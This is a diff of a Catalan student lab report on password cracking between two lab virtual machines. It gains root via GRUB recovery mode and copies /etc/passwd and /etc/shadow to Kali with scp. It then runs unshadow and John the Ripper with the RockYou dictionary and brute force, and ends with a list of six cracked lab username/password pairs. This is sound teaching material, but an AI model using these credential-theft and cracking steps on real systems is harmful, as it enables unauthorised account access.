@@ -7,12 +7,12 @@ Per realitzar l'activitat s'han utilitzat les següents màquines virtuals:
 - Ubuntu Server amb laes contrasenyes a descubrir (ova)
 - Adaptador de xarxa: Xarxa NAT
 
-![](cap1)
+![](/media/1.png)
 
 - Kali Linux
 - Adaptador de xarxa: Xarxa NAT
 
-![](cap2)
+![](/media/2.png)
 
 ---
 
@@ -20,7 +20,7 @@ Per realitzar l'activitat s'han utilitzat les següents màquines virtuals:
 
 El Primer es accedir al grub de la mv i anem a opcions avançades i a la opcio de recovery mode.
 
-![](cap3)
+![](/media/3.png)
 
 Un cop inici el menu de recuperacio anem esperem i quan s'acabi tot anem li donem a enter i ja esterem en root.
 
@@ -37,7 +37,7 @@ Per verificar la connectivitat entre les màquines s'ha de mirar la ip de Kali p
 ip a
 ```
 
-![](cap4)
+![](/media/4.png)
 
 ---
 
@@ -52,11 +52,11 @@ scp /etc/passwd usuari@IP_KALI:.
 scp /etc/shadow usuari@IP_KALI:.
 ```
 
-![](cap5)
+![](/media/5.png)
 
 I com he posat a home ja els tinc
 
-![](cap6)
+![](/media/6.png)
 
 Per poder utilitzar John the Ripper és necessari combinar la informació dels fitxers `passwd` i `shadow`.
 
@@ -65,11 +65,11 @@ S'ha utilitzat la següent comanda:
 ```bash
 unshadow passwd shadow > passwords-quico
 ```
-![](cap7)
+![](/media/7.png)
 
 Ara hem de descomprimir un diccionari de contresenyes de kali el rockyou.
 
-![](cap8)
+![](/media/8.png)
 
 ---
 
@@ -82,7 +82,7 @@ Ara hem de descomprimir un diccionari de contresenyes de kali el rockyou.
 Primer s'ha executat el mode bàsic.
 
 
-![](cap9)
+![](/media/9.png)
 
 ---
 
@@ -92,7 +92,7 @@ Posteriorment s'ha realitzat un atac de diccionari utilitzant RockYou.
 
 Captura del procés:
 
-![](cap10)
+![](/media/10.png)
 
 ---
 
@@ -102,8 +102,45 @@ Finalment s'ha executat un atac de força bruta limitat a nombres de 4 a 8 dígi
 
 Captura del procés:
 
-![](cap11)
+![](/media/11.png)
 
 ---
 
-# Provem 
+# Provem les contrasenyas a la maquina victima
+
+# Usuari: gru 
+
+Contasenya: gru
+
+![](/media/12.png)
+
+# Usuari: bob 
+
+Contasenya: password
+
+![](/media/13.png)
+
+# Usuari: kevin 
+
+Contasenya: 123456
+
+![](/media/14.png)
+
+# Usuari: stuart
+
+Contasenya: P@ssw0rd
+
+![](/media/15.png)
+
+# Usuari: herb
+
+Contasenya: love2006
+
+![](/media/16.png)
+
+# Usuari: scarlet
+
+Contasenya: a
+
+![](/media/17.png)
+
